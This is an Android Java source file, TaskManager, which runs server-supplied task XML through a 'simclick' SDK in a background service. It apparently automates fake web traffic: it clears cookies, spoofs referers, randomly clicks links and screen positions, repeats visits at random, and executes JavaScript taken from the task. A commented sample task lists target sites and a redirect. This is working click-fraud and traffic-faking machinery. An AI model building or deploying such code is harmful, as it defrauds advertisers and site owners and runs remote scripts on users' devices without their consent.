package dlg.lizhihao.com.mobilezausap.SlGeneral.task;

import android.content.Context;

import java.util.List;

import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.open.SimClickSdkForService;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.LogUtil;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.RandomUtil;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.SdkUtils;
import dlg.lizhihao.com.mobilezausap.SlGeneral.task.model.CTag;
import dlg.lizhihao.com.mobilezausap.SlGeneral.task.model.CTagCompress;
import dlg.lizhihao.com.mobilezausap.SlGeneral.task.model.PTag;
import dlg.lizhihao.com.mobilezausap.SlGeneral.task.model.TTag;

/**
 * Created by lizhihao on 16/11/8.
 */

public class TaskManager {
    private static final String TAG = TaskManager.class.getSimpleName();
    public static void executeTaskForSer(Context context, int taskId, int paramId, String taskXml, SimClickSdkForService.OnTaskResultListener onTaskResultListener) {
        SimClickSdkForService simClickSdk = SimClickSdkForService.getInstance(context);
        simClickSdk.setOnTaskResultListener(onTaskResultListener);
        simClickSdk.setDebug(true);
        //<t a="300|20|" s="http://yys.moguzb.com/" rf="http://www.baidu.com/"><p a="10,25|1|1|10"><p a="10,25|1|2|10"><p a="10,25|1|3|10"><p a="10,25|1|0|5"/></p></p></p><c a="1|1,2|510|0|0" l="href=update_log.html"/><c a="2|1,2|800|0|0" l="href=bug.html"/><c a="3|1,2|400|3" c="document.location=http://www.99ruyi.net/index_2.htm"/></t>
        LogUtil.i(TAG, "advertising  executeTaskForSer, taskXml = " + taskXml + ", taskId = " + taskId + ", paramId = " + paramId);
        List<TTag> taskList = TaskXmlParser.getInstance().parseTask(taskXml);
        if (null != taskList && taskList.size() > 0) {
            int currentNetwork = SdkUtils.getNetWork(context);
            for (TTag tTag : taskList) {
                //当前网络条件不符合则跳过该任务不执行
                if (currentNetwork < tTag.getNetworkLimit()) {
                    continue ;
                }
                LogUtil.i(TAG, "advertising tTag.getReload() / 10 = " + tTag.getReload() / 10);
                simClickSdk.beginTransaction(taskId, paramId);
                StepIndex stepIndex = new StepIndex();
                for (int i = 0; i < tTag.getReload() / 10; i ++) {
                    LogUtil.i(TAG, "advertising addTask(simClickSdk, tTag)");
                    addTask(stepIndex, simClickSdk, tTag);
                }
                if (tTag.getReload() % 10 == 0) {
                } else if (RandomUtil.isHit(tTag.getReload() % 10, 10)) {
                    LogUtil.i(TAG, "advertising tTag.getReload() % 10 = " + tTag.getReload() % 10);
                    addTask(stepIndex, simClickSdk, tTag);
                }
                simClickSdk.commitTransaction();
            }
        }
    }
    private static void addTask(StepIndex stepIndex, SimClickSdkForService simClickSdk, TTag tTag) {
        if (tTag.getCookieList() != null && tTag.getCookieList().size() > 0) {
            simClickSdk.cleanCookies( ++ stepIndex.index);
        }
        if (!SdkUtils.isEmpty(tTag.getRefer())) {
            simClickSdk.loadAndRedirPage( ++ stepIndex.index, tTag.getRefer(), tTag.getStart(),tTag.getSrc());
        } else {
            simClickSdk.loadPage( ++ stepIndex.index, tTag.getStart(),tTag.getSrc());//加载启动页
        }
        List<PTag> pTagList = tTag.getpTagList();
        stepIndex.index ++;
        for (PTag pTag : pTagList) {
            addPTask(stepIndex.index, 0, simClickSdk, tTag, pTag);
        }
    }
    private static void addPTask(double stepIndex, int deep, SimClickSdkForService simClickSdk, TTag tTag, PTag pTag) {
        if (pTag.getcId() != 0 && tTag.getcTagMap().containsKey(pTag.getcId())) {
            CTag cTag = tTag.getcTagMap().get(pTag.getcId());
            switch (cTag.getType()) {
                case CTagCompress.CTagType.LINK:
                    CTag.Link link = cTag.getLink();
                    for (int j = 0; j < pTag.getClickCount(); j++ ) {
                        if (j >= 1) {
                            simClickSdk.goBack(stepIndex - deep / 100d);
                        }
                        simClickSdk.randClickWebElement(stepIndex - deep / 100d, pTag.getStayMin(), pTag.getStayMax(), link.getLinkProperty(), link.getLinkRule(),
                                link.getLinkFlag(), link.getLink2Property(), link.getLink2Rule(), link.getLink2Flag(),
                                link.getRmProperty(), link.getRmRule(), link.getRmFlag(), link.getOperation(), cTag.getRank(), cTag.getLink().getIndex(),tTag.getSrc());
                    }
                    break;
                case CTagCompress.CTagType.SCRIPT:
                    simClickSdk.randExecuteJavaScript(stepIndex - deep / 100d, cTag.getJs().jsCode, cTag.rank, pTag.getStayMin(), pTag.getStayMax());
                    break;
                case CTagCompress.CTagType.SLIDE:
                    break;
                case CTagCompress.CTagType.POSITION:
                    simClickSdk.resizeWebView(stepIndex - deep / 100d, cTag.getPosition().width, cTag.getPosition().height);
                    simClickSdk.randClickByPosition(stepIndex - deep / 100d, cTag.getPosition().width, cTag.getPosition().height,
                            cTag.getPosition().left, cTag.getPosition().top, cTag.getPosition().rectWidth,
                            cTag.getPosition().rectHeight, cTag.getPosition().retryCount, cTag.getPosition().msgType,
                            cTag.getRank(), pTag.getStayMin(), pTag.getStayMax(),tTag.getSrc());
                    break;
            }
        }
        deep ++;
        for (PTag childPTag : pTag.getpTagList()) {
            addPTask(stepIndex, deep, simClickSdk, tTag, childPTag);
        }
    }
    private static class StepIndex {
        public double index;
    }

}
